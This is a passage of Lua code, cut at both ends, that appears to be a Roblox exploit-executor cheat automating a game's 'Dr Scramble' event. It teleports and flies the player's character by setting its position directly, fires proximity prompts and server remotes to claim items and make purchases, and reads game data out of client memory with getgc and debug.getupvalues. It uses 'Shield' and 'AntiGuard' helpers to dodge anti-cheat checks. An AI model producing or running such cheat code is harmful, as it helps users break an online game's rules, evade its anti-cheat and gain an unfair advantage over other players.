					Note = "Skip eggs worth less than this (0 = off)",
					Min = 0,
					Max = 1000,
					Default = 0,
					AllowDecimals = false,
					Increment = 1,
					SubOf = v25,
					Unit = {
						Default = "M/s",
						Selector = true,
						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = {
							Number = Color3.fromRGB(255, 255, 255),
							Suffix = Color3.fromRGB(58, 255, 55),
						},
						Callback = function(arg)
							local ms = tbl38[arg] or tbl38["M/s"]
							local slider = tbl39.Slider

							if slider and slider.SetRange then
								slider:SetRange(ms.Min, ms.Max)
								local min = tonumber(slider:Get()) or ms.Min
								local min2 = ms.Min
								local max = ms.Max
								local n28 = math.clamp(math.floor(min + 0.5), min2, max)

								if n28 ~= min then
									tbl39.Unit = tostring(arg)
									slider:Set(n28)
									return
								end

								fn40(n28, arg)
							else
								fn40(nil, arg)
							end
						end,
					},
					Callback = function(arg)
						fn40(arg, nil)
					end,
				})
			end

			v11:CreateDropdown({
				Name = "Mutation Priority",
				Note = "Which egg gets the consumable first",
				Options = tbl32,
				Default = tbl32[1],
				SubOf = v25,
				Callback = function(arg)
					str3 = tostring(arg)
				end,
			})

			fn5(v11:CreateMultiDropdown({
				Name = "Mutation Target Eggs",
				Note = "Only use the consumable on these eggs (empty = all)",
				Options = tbl34,
				Default = {},
				SubOf = v25,
				Callback = function(arg)
					local tbl38 = {}

					if type(arg) == "table" then
						for k, v27 in pairs(arg) do
							k = v27 == true and type(k) == "string" and k or type(v27) == "string" and v27
							local v28 = k or nil

							if v28 and tbl35[v28] then
								tbl38[tbl35[v28]] = true
							end
						end
					end

					tbl36 = tbl38
				end,
			}))

			fn4(function()
				n22 += 1
				tbl3.Movement.FracturedWanted = false
				tbl3.ReleaseMovement("fractured")
			end)

			tbl2.Add(function()
				local v27 = tbl3.Toggle(v21, false)
				local v28 = tbl3.Toggle(v22, false)
				local n28 = (v27 or v28) and 5 or 30
				local flag8 = not flag6
				local flag9

				if flag8 then
					flag9 = v23 == nil or n16 == 0 or os.clock() - n21 >= n28
				else
					flag9 = flag8
				end

				if flag9 then
					flag6 = true

					task.spawn(function()
						pcall(fn32, true)
						flag6 = false
					end)
				end

				if v24 and type(v24.Set) == "function" then
					pcall(v24.Set, v24, fn33())
				end

				local flag10 = flag5

				if not flag5 then
					flag10 = not (v27 or v28)
				end

				if flag10 or os.clock() < n20 then
					return false
				end
				flag5 = true
				n20 = os.clock() + n17
				local v29 = n19

				task.spawn(function()
					pcall(fn34, v29)
					flag5 = false
					tbl2.Wake()
				end)

				return false
			end)
		end

		local n17, tbl30, tbl31, tbl32, str3, tbl33, v21, v22, v23, fn30
		local fn31, fn32, fn33, fn34, fn35, fn36, fn37, fn38, fn39, fn40
		local fn41, fn42, fn43, fn44, fn45, fn46, n18, n19, n20, tbl34
		local tbl35, tbl36, tbl37, tbl38, str4, v24, tbl39, str5, n21, n22
		local n23, n24, fn47, fn48, fn49, fn50, fn51, fn52, fn53

		do
			local save = tbl.Save

			if type(save) == "table" and type(save.FieldSignal) == "function" then
				local ok, result = pcall(save.FieldSignal, "Rift")

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						n16 = 0
						tbl2.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end

			n9 = 6
			n10 = 1.5
			n17 = 400

			do
				local vector = Vector3.new(2120, -120, -355)
				tbl30 = { "LostPart1", "LostPart2" }

				local tbl40 = {
					{ Label = "Experiment #001", Id = "LimitedTimeExperimentPet" },
					{ Label = "Nibbles #013", Id = "Nibbles013" },
					{ Label = "Scrambled Mutation", Id = "MutationConsumable" },
					{ Label = "2x Cash Booster", Id = "CashBooster" },
					{ Label = "1.25x Speed", Id = "SpeedBoost" },
					{ Label = "2x Treadmill Booster", Id = "TreadmillBooster" },
				}

				tbl31 = {}

				for _, v25 in ipairs(tbl40) do
					tbl31[#tbl31 + 1] = v25.Label
				end

				tbl23 = {}
				tbl24 = {}
				n11 = 0

				tbl32 = {
					["Experiment #001"] = true,
					["Nibbles #013"] = true,
					["Scrambled Mutation"] = true,
				}

				snapshot = nil
				n12 = -math.huge
				flag3 = false
				n13 = 0
				n14 = 0
				str2 = ""
				str3 = ""
				tbl33 = { Tool = nil, EquipAt = 0 }
				tbl25 = { Latch = false, Ended = false }
				flag4 = false
				n15 = 0
				v21 = nil
				v22 = nil
				v23 = nil

				local function fn54()
					local packages = ReplicatedStorage:FindFirstChild("Packages")
					local networking2 = packages and packages:FindFirstChild("Networking")
					networking2 = networking2 and networking2:FindFirstChild("RF/Scramble/Request")
					if networking2 and networking2:IsA("RemoteFunction") then
						return networking2
					end
					return nil
				end

				fn9 = function(arg, ...)
					local v25 = fn54()
					if not v25 then
						return nil
					end
					local v26 = table.pack(...)

					local ok, result = pcall(function()
						return v25:InvokeServer(arg, table.unpack(v26, 1, v26.n))
					end)

					if not ok or type(result) ~= "table" then
						return nil
					end

					if type(result.Snapshot) == "table" then
						snapshot = result.Snapshot
						n12 = os.clock()
					elseif arg == "Snapshot" and type(result.State) == "table" then
						snapshot = result
						n12 = os.clock()
					end

					return result
				end

				fn10 = function(arg)
					if arg or snapshot == nil or os.clock() - n12 >= n9 then
						fn9("Snapshot")
					end

					return snapshot
				end

				fn11 = function()
					local v25 = snapshot
					return type(v25) == "table" and type(v25.State) == "table" and v25.State or nil
				end

				fn12 = function()
					local v25 = snapshot
					if type(v25) ~= "table" or v25.Enabled == false or type(v25.State) ~= "table" then
						return false
					end
					local num = tonumber(v25.EventEndsAt)
					return num == nil or workspace:GetServerTimeNow() < num
				end

				fn13 = function()
					local v25 = snapshot
					local window = type(v25) == "table" and v25.Window or nil
					if type(window) ~= "table" then
						return false, nil
					end
					local serverTimeNow = workspace:GetServerTimeNow()
					local num = tonumber(window.StartsAt)
					local num2 = tonumber(window.EndsAt)
					if window.Active == true or num and num2 and serverTimeNow >= num and serverTimeNow < num2 then
						return true, num2 and math.max(0, num2 - serverTimeNow) or nil
					end
					local num3 = tonumber(window.NextAt)
					return false, num3 and math.max(0, num3 - serverTimeNow) or nil
				end

				fn30 = function(arg, arg2)
					local lostParts = type(arg) == "table" and arg.LostParts or nil
					if type(lostParts) ~= "table" then
						return false
					end

					if lostParts[arg2] then
						return true
					end

					for _, lostPart in pairs(lostParts) do
						if lostPart == arg2 then
							return true
						end
					end

					return false
				end

				fn31 = function(arg)
					local n25 = 0

					for _, v25 in ipairs(tbl30) do
						if fn30(arg, v25) then
							n25 += 1
						end
					end

					return n25
				end

				local function fn55(arg)
					local n25 = math.max(0, math.floor(tonumber(arg) or 0))
					if n25 >= 3600 then
						return string.format("%dh %dm", n25 // 3600, n25 % 3600 // 60)
					end
					return string.format("%dm %ds", n25 // 60, n25 % 60)
				end

				fn14 = function()
					local v25 = fn11()
					if not v25 then
						return "Dr Scramble event is not running"
					end

					if not fn12() then
						return "Dr Scramble event has ended"
					end
					local v26, v27 = fn13()
					local str6

					if v26 then
						str6 = "Outbreak live " .. fn55(v27 or 0)
					else
						str6 = v26
					end

					str6 = str6 or v27 and "Outbreak in " .. fn55(v27) or "Outbreak soon"
					local str7 = v25.Completed == true and "Vault claimed"

					if not str7 then
						str7 = string.format("Lost %d/2  Drone %d/3", fn31(v25), math.min(3, tonumber(v25.DroneParts) or 0))
					end

					if v26 then
						local n25 = 0

						for _, v28 in pairs(tbl23) do
							if (tonumber(v28.Health) or 0) > 0 then
								n25 += 1
							end
						end

						str6 ..= string.format("  %d drones", n25)
					end

					local str8 = string.format("Samples %d  -  %s  -  %s", tonumber(v25.Samples) or 0, str7, str6)

					if str3 ~= "" and tbl3.Toggle(v21, false) then
						str8 ..= "  -  " .. str3
					end

					if str2 ~= "" then
						str8 ..= "  -  " .. str2
					end

					return str8
				end

				fn32 = function()
					return tbl3.Root()
				end

				fn33 = function(arg, arg2, arg3, arg4)
					local v25 = arg4 or n17
					local v26 = fn32()
					if not v26 then
						return false
					end
					arg3 = arg3 or 1
					if (v26.Position - arg).Magnitude <= arg3 then
						return true
					end
					tbl3.Shield("scramble", true)
					local n25 = os.clock() + 6

					while not tbl3.Swapped() and os.clock() < n25 and not arg2() do
						str2 = "Waiting for the character to settle"
						RunService.Heartbeat:Wait()
					end

					v26 = fn32() or v26
					local character = localPlayer.Character
					tbl3.Driving = tbl3.Driving + 1
					local position = v26.Position
					local flag5 = nil
					local n26 = (arg - position).Magnitude / v25 + 3
					local n27 = 0

					local connection = RunService.Heartbeat:Connect(function(deltaTime)
						if flag5 ~= nil or tbl3.AntiGuard.Busy then
							return
						end
						n27 += deltaTime
						local v27 = fn32()
						if not v27 or arg2() or n27 > n26 or localPlayer.Character ~= character then
							flag5 = false
							return
						end

						if (v27.Position - position).Magnitude > 8 then
							position = v27.Position
						end

						local n28 = arg - position
						local n29 = v25 * deltaTime
						local flag6 = n28.Magnitude <= math.max(n29, arg3)
						position = flag6 and arg or position + n28.Unit * n29
						local vector2 = Vector3.new(n28.X, 0, n28.Z)
						local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v27.CFrame.Rotation

						pcall(function()
							v27.CFrame = CFrame.new(position) * cframe
							v27.AssemblyLinearVelocity = Vector3.zero
							v27.AssemblyAngularVelocity = Vector3.zero
						end)

						if flag6 then
							flag5 = true
						end
					end)

					while flag5 == nil do
						RunService.Heartbeat:Wait()
					end

					connection:Disconnect()
					tbl3.Driving = math.max(0, tbl3.Driving - 1)
					tbl3.Shield("scramble", false)
					return flag5
				end

				fn34 = function(arg)
					if typeof(arg) ~= "Instance" or not arg:IsA("ProximityPrompt") then
						return false
					end

					local ok = pcall(function()
						arg:InputHoldBegin()
						local n25 = tonumber(type(tbl3.PromptHold) == "function" and tbl3.PromptHold(arg) or arg.HoldDuration) or 0

						if n25 > 0 then
							task.wait(n25 + 0.2)
						end

						arg:InputHoldEnd()
					end)

					if not ok and type(fireproximityprompt) == "function" then
						ok = pcall(fireproximityprompt, arg)
					end

					return ok
				end

				local function fn56()
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("SecretZones")
					return world and world:FindFirstChild("Cave") or nil
				end

				fn35 = function(arg)
					local teleporter = fn56()
					teleporter = teleporter and teleporter:FindFirstChild("Teleporter")
					local secretZonePrompt = teleporter and teleporter:FindFirstChild(arg)
					secretZonePrompt = secretZonePrompt and secretZonePrompt:FindFirstChild("SecretZonePrompt", true)
					return secretZonePrompt and secretZonePrompt:IsA("ProximityPrompt") and secretZonePrompt or nil
				end

				fn36 = function(arg, arg2)
					arg = arg and arg.Parent
					if arg and arg:IsA("Attachment") then
						return arg.WorldPosition
					end

					if arg and arg:IsA("BasePart") then
						return arg.Position
					end
					return arg2
				end

				fn37 = function()
					local v25 = fn32()
					if not v25 then
						return false
					end
					local position = v25.Position
					local vector2 = Vector3.new(position.X - vector.X, 0, position.Z - vector.Z)
					return position.Y < -60 and vector2.Magnitude < 160
				end

				local function fn57()
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("SeparationLine")
					return world and world:IsA("BasePart") and world.Position.X or 552
				end

				fn38 = function(arg)
					if not arg then
						local v25 = fn32()
						arg = v25 and v25.Position
					end

					return arg ~= nil and arg.X < fn57()
				end

				local connection = localPlayer.CharacterAdded:Connect(function()
					tbl3.ScrambleRespawned = true
					tbl33.Tool = nil
					tbl33.EquipAt = 0
				end)

				fn4(function()
					pcall(function()
						connection:Disconnect()
					end)
				end)

				fn39 = function(arg, arg2)
					if not fn38() then
						tbl3.ScrambleRespawned = false
						return true
					end

					if arg2 and fn38(arg2) then
						return true
					end

					local function fn58()
						str2 = "Respawned, resting in the safe zone"
						local n25 = os.clock() + 0.75

						while os.clock() < n25 do
							if arg() then
								return false
							end
							task.wait(0.1)
						end

						tbl3.ScrambleRespawned = false
						return true
					end

					local flag5 = type(tbl3.StealHome) == "function" and tbl3.StealHome() or nil
					if not flag5 then
						tbl3.ScrambleRespawned = false
						return true
					end
					local flag6 = tbl3.ScrambleRespawned == true

					if tbl3.DistanceTo(flag5) <= 12 then
						if flag6 then
							return (fn58())
						end
						return true
					end

					str2 = flag6 and "Respawned, easing out through the safe zone" or "Leaving the base through the safe zone"
					local v25 = fn33
					local v26 = v25(flag5 + Vector3.new(0, 3, 0), arg, 3, flag6 and math.min(n17, 300) or nil)
					if v26 and flag6 then
						return (fn58())
					end
					return v26
				end

				local function fn58(arg, arg2, arg3)
					local v25 = fn32()
					if not v25 then
						return false
					end
					tbl3.Shield("scramblefly", true)
					local position = v25.Position
					local flag5 = true

					if Vector3.new(arg.X - position.X, 0, arg.Z - position.Z).Magnitude > 250 then
						local n25 = math.max(position.Y, arg.Y, 98)
						flag5 = fn33(Vector3.new(position.X, n25, position.Z), arg2, 2) and fn33(Vector3.new(arg.X, n25, arg.Z), arg2, 2)
					end

					flag5 = flag5 and fn33(arg, arg2, math.min(arg3, 2))
					tbl3.Shield("scramblefly", false)
					return flag5
				end

				local function fn59()
					local flag5 = type(tbl3.StealHome) == "function" and tbl3.StealHome() or nil
					return flag5 and flag5 + Vector3.new(0, 3, 0) or nil
				end

				fn40 = function(arg, arg2, arg3)
					local n25 = arg3 or 6
					if tbl3.DistanceTo(arg) <= n25 then
						return true
					end
					local v25 = fn38()
					local v26 = fn38(arg)

					if v25 and not v26 then
						if not fn39(arg2, arg) then
							return false
						end
					elseif v26 and not v25 then
						local v27 = fn59()

						if v27 and (v27 - arg).Magnitude > 12 and tbl3.DistanceTo(v27) > 12 then
							str2 = "Coming back through the safe zone"
							if not fn58(v27, arg2, 3) then
								return false
							end
						end
					end

					return fn58(arg, arg2, n25)
				end

				fn41 = function(arg)
					if fn38() or arg() or tbl3.IsNight() or tbl3.WallSealed() then
						return
					end
					local v25 = fn59()

					if v25 then
						str2 = "Coming back through the safe zone"
						fn40(v25, arg, 4)
					end
				end

				fn42 = function(arg)
					if fn37() then
						return true
					end
					local Entry = fn35("Entry")
					local v25 = fn36(Entry, Vector3.new(2125.7, 73.1, -295.4))
					str2 = "Flying to the Secret Cave"
					if not fn40(v25, arg, 6) then
						return false
					end

					for i = 1, 4 do
						if arg() then
							return false
						end
						str2 = "Entering the Secret Cave"
						fn34(Entry or fn35("Entry"))
						local n25 = os.clock() + 1.5

						while os.clock() < n25 and not fn37() do
							RunService.Heartbeat:Wait()
						end

						if fn37() then
							return true
						end
					end

					str2 = "Cave door missed, flying in"
					local quest = type(snapshot) == "table" and snapshot.Quest or nil
					local position = type(quest) == "table" and type(quest.EscapedExperiment) == "table" and quest.EscapedExperiment.Position or nil

					if typeof(position) == "Vector3" then
						pcall(tbl3.FlyTo, position, arg, "scramble")
					end

					return fn37()
				end

				local function fn60(arg)
					local quest = type(snapshot) == "table" and snapshot.Quest or nil
					local flag5 = type(quest) == "table" and quest[arg] or nil
					local position = type(flag5) == "table" and flag5.Position or nil
					if typeof(position) == "Vector3" then
						return position
					end
					local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
					drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(arg)
					if drScrambleEvent and drScrambleEvent:IsA("Model") then
						return drScrambleEvent:GetPivot().Position
					end
					return nil
				end

				local function fn61(arg)
					local v25 = snapshot
					local interactions = type(v25) == "table" and v25.Interactions or nil
					return math.max(4, (type(interactions) == "table" and tonumber(interactions[arg]) or 12) - 4)
				end

				fn43 = function(arg)
					local v25 = fn11()
					if not v25 or v25.Discovered == true then
						return true
					end
					local EscapedExperiment = fn60("EscapedExperiment")
					if not EscapedExperiment or not fn42(arg) then
						return false
					end
					str2 = "Talking to the Escaped Experiment"
					if not fn33(EscapedExperiment, arg, fn61("NpcRadius")) then
						return false
					end
					local Discover = fn9("Discover")
					fn10(true)
					return Discover ~= nil and fn11() ~= nil and fn11().Discovered == true
				end

				fn44 = function(arg)
					local v25 = fn11()
					local flag5 = not v25 or v25.Completed == true

					if not flag5 then
						local n25 = #tbl30
						flag5 = fn31(v25) >= n25
					end

					if flag5 then
						return
					end

					if v25.Discovered ~= true and not fn43(arg) then
						return
					end

					for _, v26 in ipairs(tbl30) do
						if arg() then
							return
						end

						if not fn30(fn11(), v26) then
							local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
							drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(v26)
							drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild("Hitbox", true)
							local claimLostPart = drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
							local position = drScrambleEvent and drScrambleEvent:IsA("BasePart") and drScrambleEvent.Position or fn60(v26)

							if position then
								str2 = "Flying to " .. (v26 == "LostPart1" and "Lost Part 1" or "Lost Part 2")

								if fn40(position + Vector3.new(0, 2, 0), arg, 3) then
									str2 = "Collecting the lost part"
									local n25 = position + Vector3.new(0, 2.5, 0)
									local character = localPlayer.Character
									tbl3.Shield("scramble", true)
									tbl3.Driving = tbl3.Driving + 1

									local connection2 = RunService.Heartbeat:Connect(function()
										local v27 = tbl3.Root()
										if not v27 or v27.Parent ~= character or tbl3.AntiGuard.Busy or tbl3.Movement.Owner ~= "scramble" then
											return
										end

										pcall(function()
											local rotation = v27.CFrame.Rotation
											v27.CFrame = CFrame.new(n25) * rotation
											v27.AssemblyLinearVelocity = Vector3.zero
											v27.AssemblyAngularVelocity = Vector3.zero
										end)
									end)

									for i = 1, 4 do
										if not arg() then
											claimLostPart = claimLostPart or drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
											fn34(claimLostPart)
											task.wait(0.6)
											fn10(true)
											if not fn30(fn11(), v26) then
												continue
											end
										end

										break
									end

									connection2:Disconnect()
									tbl3.Driving = math.max(0, tbl3.Driving - 1)
									tbl3.Shield("scramble", false)
									if arg() then
										return
									end
									continue
								end
							end
						end
					end
				end

				fn45 = function(arg)
					local v25 = fn11()
					if not v25 or v25.Completed == true then
						return
					end
					local num = tonumber(v25.TotalParts)

					if not num then
						num = fn31(v25) + (tonumber(v25.DroneParts) or 0)
					end

					if num < 5 then
						return
					end
					local ExperimentVault = fn60("ExperimentVault")
					if not ExperimentVault or not fn42(arg) then
						return
					end
					str2 = "Opening the Experiment Vault"
					if not fn33(ExperimentVault, arg, fn61("VaultRadius")) then
						return
					end
					fn9("Vault")
					fn10(true)
					local v26 = fn11()

					if v26 and v26.Completed == true then
						str2 = "Vault opened, The Scrambler unlocked"
					end
				end

				fn46 = function()
					local function fn62(arg)
						if not arg or not arg:IsA("Tool") then
							return false
						end

						if tostring(arg:GetAttribute("ItemType")) ~= "MutationConsumable" then
							return false
						end
						local attribute = arg:GetAttribute("MutationId") or arg:GetAttribute("MutationTemplate")
						if attribute ~= nil then
							return tostring(attribute) == "Scrambled"
						end
						return string.find(string.lower(arg.Name), "scrambled", 1, true) ~= nil
					end

					local character = localPlayer.Character

					if character then
						for _, child in ipairs(character:GetChildren()) do
							if fn62(child) then
								return child, true
							end
						end
					end

					local backpack = localPlayer:FindFirstChildOfClass("Backpack")

					if backpack then
						for _, child in ipairs(backpack:GetChildren()) do
							if fn62(child) then
								return child, false
							end
						end
					end

					return nil, false
				end

				fn15 = function(arg, arg2)
					local shopPurchases = type(arg) == "table" and arg.ShopPurchases or nil
					local flag5 = type(shopPurchases) == "table" and shopPurchases[arg2.Id] or nil
					if type(flag5) ~= "table" then
						return 0
					end
					local shopPeriod = type(snapshot) == "table" and snapshot.ShopPeriod or nil
					if flag5.Period ~= nil and shopPeriod ~= nil and flag5.Period ~= shopPeriod then
						return 0
					end
					return tonumber(flag5.Count) or 0
				end

				fn16 = function(arg)
					local v25 = fn10(true)
					if type(v25) ~= "table" or type(v25.Shop) ~= "table" then
						return
					end

					for _, v26 in ipairs(tbl40) do
						if arg() then
							return
						end

						if tbl32[v26.Label] == true then
							for i = 1, 10 do
								local v27 = snapshot
								local v28 = fn11()
								local v29 = ipairs
								local shop = type(v27) == "table" and v27.Shop or {}
								local v30 = nil

								for _, v31 in v29(shop) do
									if type(v31) == "table" and v31.Id == v26.Id then
										v30 = v31
									end
								end

								if not (not v30 or not v28 or arg()) then
									local num = tonumber(v30.PurchaseLimit)

									if not (num and fn15(v28, v30) >= num) then
										if not ((tonumber(v28.Samples) or 0) - (tonumber(v30.Price) or math.huge) < n11) then
											local Shop = fn9("Shop", v30.Id, { Quote = v30.Quote, Sequence = tonumber(v28.ShopSequence) or 0 })

											if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
												str2 = "Bought " .. v26.Label
												task.wait(0.4)
												continue
											end
										end
									end
								end

								break
							end
						end
					end
				end
			end

			do
				local n25 = 98
				n18 = 12
				n19 = 20
				n20 = 3

				tbl34 = {
					Vector3.new(2000, 90, -360),
					Vector3.new(2700, 90, -370),
					Vector3.new(3400, 90, -365),
					Vector3.new(4100, 90, -360),
					Vector3.new(4800, 90, -370),
					Vector3.new(5500, 90, -360),
					Vector3.new(5900, 90, -365),
				}

				tbl26 = {}
				local tbl40 = { Link = nil, Goal = nil, Look = nil, Character = nil }
				local userId = localPlayer.UserId

				tbl35 = {
					{ Label = "Scrap Drone", Tier = "ScrapDrone" },
					{ Label = "Reactor Drone", Tier = "ReactorDrone" },
					{ Label = "Augmented Drone", Tier = "AugmentedDrone" },
				}

				tbl36 = {}

				for _, v25 in ipairs(tbl35) do
					tbl36[#tbl36 + 1] = v25.Label
				end

				tbl37 = { "Nearest", "Rare First", "Most HP First" }
				tbl38 = { ScrapDrone = true, ReactorDrone = true, AugmentedDrone = true }
				str4 = tbl37[1]
				v24 = nil
				tbl39 = { "Tween", "Teleport" }
				str5 = tbl39[1]
				n21 = 110
				n22 = 1.5
				n23 = 0
				n24 = -math.huge

				local function fn54(arg)
					local num = type(arg) == "table" and tonumber(arg.OwnerUserId) or nil
					return num == nil or num == userId
				end

				local function fn55(arg)
					if typeof(arg) == "CFrame" then
						return arg.Position
					end

					if typeof(arg) == "Vector3" then
						return arg
					end
					return nil
				end

				local function fn56(arg, arg2)
					local v25 = networking:FindFirstChild(arg)
					if not v25 or not v25:IsA("RemoteEvent") then
						return
					end

					local connection = v25.OnClientEvent:Connect(function(...)
						pcall(arg2, ...)
					end)

					fn4(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)
				end

				fn56("RE/Scramble/Drones", function(arg)
					if type(arg) ~= "table" then
						return
					end
					local v25 = pairs
					local upserts = type(arg.Upserts) == "table" and arg.Upserts or {}

					for _, upsert in v25(upserts) do
						if type(upsert) == "table" and upsert.Id ~= nil and fn54(upsert) then
							local id = tostring(upsert.Id)
							local attributes = type(upsert.Attributes) == "table" and upsert.Attributes or {}
							local tbl41 = tbl23[id] or {}
							tbl41.Id = id
							tbl41.Position = fn55(upsert.CFrame) or tbl41.Position
							tbl41.Health = tonumber(upsert.Health) or tbl41.Health or 1
							tbl41.Tier = tostring(attributes.ScrambleTier or tbl41.Tier or "")
							tbl41.Area = tostring(attributes.ScrambleArea or tbl41.Area or "")
							tbl41.Seen = os.clock()
							tbl23[id] = tbl41
						end
					end

					local v26 = pairs
					local removed = type(arg.Removed) == "table" and arg.Removed or {}

					for k, v27 in v26(removed) do
						local v28 = tbl23
						local v29 = tostring
						v27 = type(v27) == "string" and v27
						v28[v29(v27 or k)] = nil
					end
				end)

				fn56("RE/Scramble/Effect", function(arg, arg2, arg3)
					if arg ~= "Hit" or type(arg3) ~= "table" or arg3.DroneId == nil then
						return
					end
					local v25 = tbl23[tostring(arg3.DroneId)]
					if not v25 then
						return
					end
					v25.Position = fn55(arg2) or v25.Position
					v25.Health = (tonumber(v25.Health) or 1) - (tonumber(arg3.Amount) or 1)

					if type(arg3.Motion) == "string" and string.find(arg3.Motion, "\"Death\"", 1, true) then
						v25.Health = 0
					end

					if v25.Health <= 0 then
						tbl23[v25.Id] = nil
					end
				end)

				fn56("RE/Scramble/Drops", function(arg)
					local v25 = pairs
					arg = type(arg) == "table" and arg or {}

					for _, v26 in v25(arg) do
						if type(v26) == "table" and v26.Id ~= nil and fn54(v26) then
							local v27 = fn55(v26.Position) or fn55(v26.Origin)

							if v27 then
								tbl24[tostring(v26.Id)] = {
									Position = v27,
									Radius = tonumber(v26.Radius) or 6,
									ExpiresAt = tonumber(v26.ExpiresAt),
									Kind = v26.Kind,
								}
							end
						end
					end
				end)

				fn56("RE/Scramble/State", function(arg)
					if type(arg) ~= "table" then
						return
					end

					if arg.Patch == true and type(snapshot) == "table" then
						for k, v25 in pairs(arg) do
							if k ~= "Patch" then
								snapshot[k] = v25
							end
						end
					elseif type(arg.State) == "table" then
						snapshot = arg
					end

					n12 = os.clock()
				end)

				fn56("RE/Scramble/RemoveDrops", function(arg)
					local v25 = pairs
					arg = type(arg) == "table" and arg or {}

					for k, v26 in v25(arg) do
						local v27 = tbl24
						local v28 = tostring
						v26 = type(v26) == "string" and v26
						v27[v28(v26 or k)] = nil
					end
				end)

				fn47 = function(arg)
					local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
					return scrambleLocalVisuals and scrambleLocalVisuals:FindFirstChild("PersonalDrone_" .. arg) or nil
				end

				local v25 = nil
				local n26 = 0

				local function fn57()
					if v25 and next(v25) ~= nil then
						return v25
					end
					v25 = nil
					if os.clock() < n26 or type(getgc) ~= "function" or not fn13() then
						return nil
					end
					n26 = os.clock() + 15

					for _, v26 in ipairs(getgc(false)) do
						if type(v26) == "function" and islclosure(v26) then
							local ok, result = pcall(debug.info, v26, "s")

							if ok and type(result) == "string" and string.find(result, "PersonalDrones", 1, true) then
								local ok2, result2 = pcall(debug.getupvalues, v26)

								if ok2 and type(result2) == "table" then
									for _, v27 in pairs(result2) do
										if type(v27) ~= "table" then
											continue
										end
										local key, v28 = next(v27)
										if type(v28) == "table" and v28.OwnerUserId ~= nil and v28.CFrame ~= nil then
											v25 = v27
											return v27
										end
									end

									continue
								end
							end
						end
					end

					return nil
				end

				local function fn58()
					local v26 = fn57()
					if not v26 then
						return
					end

					for k, v27 in pairs(v26) do
						if type(v27) == "table" and fn54(v27) then
							local str6 = tostring(v27.Id or k)
							local attributes = type(v27.Attributes) == "table" and v27.Attributes or {}
							local tbl41 = tbl23[str6]
							local num = tonumber(v27.Health)

							if not tbl41 then
								tbl41 = { Id = str6, Health = num or 1 }
								tbl23[str6] = tbl41
							elseif num then
								tbl41.Health = math.min(num, tonumber(tbl41.Health) or num)
							end

							tbl41.Position = fn55(v27.CFrame) or tbl41.Position
							tbl41.Tier = tostring(attributes.ScrambleTier or tbl41.Tier or "")
							tbl41.Area = tostring(attributes.ScrambleArea or tbl41.Area or "")

							if attributes.DroneState == "Death" then
								tbl41.Health = 0
							end
						end
					end

					for k in pairs(tbl23) do
						if v26[k] == nil then
							tbl23[k] = nil
						end
					end
				end

				fn48 = function()
					pcall(fn58)
					local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
					if not scrambleLocalVisuals then
						return
					end

					for _, child in ipairs(scrambleLocalVisuals:GetChildren()) do
						local attribute = child:GetAttribute("ScrambleDroneId")

						if child:IsA("Model") and attribute ~= nil and string.sub(child.Name, 1, 14) == "PersonalDrone_" then
							local str6 = tostring(attribute)

							if child:GetAttribute("DroneState") == "Death" then
								tbl23[str6] = nil
							elseif not tbl23[str6] then
								local ok, result = pcall(child.GetPivot, child)

								tbl23[str6] = {
									Id = str6,
									Position = ok and result.Position or nil,
									Health = tonumber(child:GetAttribute("Health")) or 1,
									Tier = tostring(child:GetAttribute("ScrambleTier") or ""),
									Area = tostring(child:GetAttribute("ScrambleArea") or ""),
									Seen = os.clock(),
								}
							end
						end
					end
				end

				fn49 = function(arg)
					local v26 = fn47(arg.Id)
					local hitbox = v26 and v26:FindFirstChild("Hitbox")
					if hitbox and hitbox:IsA("BasePart") then
						return hitbox.Position
					end

					if v26 and v26.PrimaryPart then
						return v26.PrimaryPart.Position
					end
					return arg.Position
				end

				fn50 = function()
					local tbl41 = {}
					local now = os.clock()

					for k, v26 in pairs(tbl23) do
						local flag5 = v26.Tier == nil or v26.Tier == "" or tbl38[v26.Tier] == true

						if flag5 then
							flag5 = (tonumber(v26.Health) or 0) > 0
						end

						flag5 = flag5 and v26.Position

						if flag5 then
							flag5 = (tbl26[k] or 0) <= now
						end

						if flag5 then
							tbl41[#tbl41 + 1] = v26
						end
					end

					return tbl41
				end

				fn51 = function()
					local v26 = fn32()
					if not v26 then
						return nil
					end
					local huge = math.huge
					local v27 = nil

					for _, v28 in ipairs(fn50()) do
						local magnitude = ((fn49(v28) or v28.Position) - v26.Position).Magnitude
						local v29 = str4

						if v29 == "Rare First" then
							if v28.Tier == "AugmentedDrone" then
								magnitude -= 200000
							elseif v28.Tier == "ReactorDrone" then
								magnitude -= 100000
							end
						elseif v29 == "Most HP First" then
							magnitude -= (tonumber(v28.Health) or 0) * 100000
						end

						if magnitude < huge then
							huge = magnitude
							v27 = v28
						end
					end

					return v27
				end

				fn52 = function()
					local v26 = fn32()
					if not v26 then
						return nil, nil
					end
					local serverTimeNow = workspace:GetServerTimeNow()
					local huge = math.huge
					local v27 = nil
					local v28 = nil

					for k, v29 in pairs(tbl24) do
						if v29.ExpiresAt and v29.ExpiresAt < serverTimeNow then
							tbl24[k] = nil
						else
							local magnitude = (v29.Position - v26.Position).Magnitude

							if v29.Kind == "Part" then
								magnitude -= 100000
							end

							if magnitude < huge then
								huge = magnitude
								v27 = k
								v28 = v29
							end
						end
					end

					return v27, v28
				end

				fn17 = function()
					if not tbl40.Link then
						if tbl40.SwapWait then
							tbl40.SwapWait = nil
							tbl3.Shield("scramble", false)
						end

